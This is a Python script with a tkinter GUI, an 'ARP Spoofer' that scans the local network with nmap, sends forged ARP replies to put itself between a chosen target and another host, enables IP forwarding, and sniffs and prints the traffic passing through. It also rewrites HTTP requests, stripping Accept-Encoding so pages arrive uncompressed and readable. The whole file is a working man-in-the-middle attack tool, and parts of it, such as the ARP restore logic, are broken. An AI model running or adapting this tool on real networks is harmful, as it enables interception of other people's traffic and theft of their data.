#!/usr/bin/env python
import scapy.all as scapy
import subprocess
import re
import sys
import tkinter as tk
from tkinter import messagebox
import threading


original_mappings = {}
sniffing_thread = None

def enable_ip_forwarding():
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    print("IPv4 forwarding enabled.")

def disable_ip_forwarding():
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
    print("IPv4 forwarding disabled.")

def get_local_ip():
    # Execute 'ip route show' command to get the local IP address
    route_result = subprocess.check_output(["ip", "route", "show"]).decode("utf-8")
    local_ip = route_result.split(" ")[8]
    return local_ip

def get_router_ip():
    # Execute 'ip route show' command to get the router's IP address
    route_result = subprocess.check_output(["ip", "route", "show", "default"]).decode("utf-8")
    for line in route_result.split("\n"):
        if "default via" in line:
            router_ip = line.split(" ")[2]
            return router_ip
    return None

def get_network_hosts(ip):
    # Execute 'nmap' command to discover hosts in the network
    nmap_command = ["nmap", "-sn", "-PR", ip + "/24"]
    nmap_result = subprocess.check_output(nmap_command).decode("utf-8")
    hosts = re.findall(r"(\d+\.\d+\.\d+\.\d+)", nmap_result)
    return hosts

def get_target_mac(ip):
    # Create an ARP request packet to get the target MAC address
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # Send the packet and capture the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Return the MAC address of the first response
    if answered_list:
        return answered_list[0][1].hwsrc

def spoof_arp(target_ip, target_mac, spoof_ip):
    # Create an ARP response packet to spoof the target
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Send the packet
    scapy.send(arp_response, verbose=False)

def restore_arp():
    for target_ip, original_mac in original_mappings.items():
        target_mac = get_target_mac(target_ip)
        if target_mac is not None:
            arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=original_mac)
            scapy.send(arp_response, verbose=False)

def start_arp_spoofing():
    target_ip = network_hosts[target_index.get()]
    spoof_ip = network_hosts[spoof_index.get()]

    target_mac = get_target_mac(target_ip)
    if target_mac is None:
        messagebox.showerror("Error", "Unable to get target MAC address. Exiting.")
        return

    enable_ip_forwarding()
    spoof_thread = threading.Thread(target=spoof_arp, args=(target_ip, target_mac, spoof_ip))
    sniff_thread = threading.Thread(target=sniff_packets)

    spoof_thread.start()
    sniff_thread.start()


def stop_arp_spoofing():
    restore_arp()
    disable_ip_forwarding()
    if sniffing_thread and sniffing_thread.is_alive():
        sniffing_thread.join()
    messagebox.showinfo("Info", "ARP spoofing stopped.")
    sys.exit(0)

def update_network_hosts():
    global network_hosts
    network_hosts = get_network_hosts(router_ip)

    target_dropdown['menu'].delete(0, 'end')
    spoof_dropdown['menu'].delete(0, 'end')

    for index, host in enumerate(network_hosts):
        target_dropdown['menu'].add_command(label=host, command=tk._setit(target_index, index))
        spoof_dropdown['menu'].add_command(label=host, command=tk._setit(spoof_index, index))

def update_router_ip():
    global router_ip
    router_ip = get_router_ip()
    router_label.config(text=f"Router IP: {router_ip}")
    update_network_hosts()

def modify_request(packet):
    if packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 80 and packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode()  # Convert bytes to string
        # Remove the encoding from the request
        modified_load = re.sub(r"Accept-Encoding:.*?\\r\\n", "", load)
        packet[scapy.Raw].load = modified_load.encode()  # Convert string back to bytes
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum

        # Forward the modified packet
        packet.add_payload(bytes(packet))
        scapy.send(packet, verbose=False)


def sniff_packets():
    global sniffing_thread
    while True:
        if sys.platform == "win32":
            sniffed_packet = scapy.sniff(filter="ip", count=1)
        else:
            sniffed_packet = scapy.sniff(filter="ip", iface="eth0", count=1)
        # Print the Ethernet header
        print("Ethernet Header:")
        print(sniffed_packet[0].show())
        # Print the raw data
        print("Raw Data:")
        print(sniffed_packet[0].payload)

        # Modify the request packet
        modify_request(sniffed_packet[0])
        # Add a separator between packets
        print("------------------------------------------------------")

def spoof_packets(target_ip, target_mac, spoof_ip):
    while True:
        spoof_arp(target_ip, target_mac, spoof_ip)
        status_label.config(text=f"ARP packet sent. Spoofing {target_ip} with {spoof_ip}")

# Create the main window
window = tk.Tk()
window.title("ARP Spoofer")

# Create the header label
header_label = tk.Label(window, text="ARP Spoofer", font=("Helvetica", 16, "bold"))
header_label.pack(pady=10)

# Create the local IP label
local_ip = get_local_ip()
local_label = tk.Label(window, text=f"Local IP: {local_ip}")
local_label.pack()

# Create the router IP label
router_ip = get_router_ip()
router_label = tk.Label(window, text=f"Router IP: {router_ip}")
router_label.pack()

# Create the network hosts dropdowns
network_hosts = get_network_hosts(router_ip)

target_label = tk.Label(window, text="Target IP:")
target_label.pack()

target_index = tk.IntVar(window)
target_dropdown = tk.OptionMenu(window, target_index, *range(len(network_hosts)))
target_dropdown.pack()

spoof_label = tk.Label(window, text="Spoof IP:")
spoof_label.pack()

spoof_index = tk.IntVar(window)
spoof_dropdown = tk.OptionMenu(window, spoof_index, *range(len(network_hosts)))
spoof_dropdown.pack()

# Create the start and stop buttons
start_button = tk.Button(window, text="Start", command=start_arp_spoofing)
start_button.pack(pady=10)

stop_button = tk.Button(window, text="Stop", command=stop_arp_spoofing)
stop_button.pack(pady=5)

# Create the status label
status_label = tk.Label(window, text="")
status_label.pack(pady=10)

# Update the network hosts and router IP initially
update_network_hosts()
update_router_ip()

# Start the main GUI event loop
window.mainloop()
